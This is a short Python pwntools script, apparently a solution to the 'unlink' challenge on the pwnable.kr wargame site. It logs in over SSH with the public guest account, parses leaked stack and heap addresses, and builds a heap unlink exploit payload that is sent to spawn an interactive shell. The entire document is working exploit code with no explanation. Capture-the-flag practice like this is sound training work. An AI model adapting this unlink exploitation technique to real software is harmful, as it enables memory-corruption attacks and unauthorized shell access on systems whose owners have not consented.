from pwn import *

shell = ssh(user='unlink', host = 'pwnable.kr', port = 2222, password='guest')

s = shell.process('./unlink')

s.recvuntil('here is stack address leak: ')
stack = int(s.recv(10),16)
s.recvuntil('here is heap address leak: ')
heap = int(s.recv(10),16)


exploit = p32(0x080484eb)
exploit += 'A'*12
exploit += p32(heap+0xc)
exploit += p32(stack+0x10)



s.sendlineafter('get shell!\n', exploit)
s.interactive()





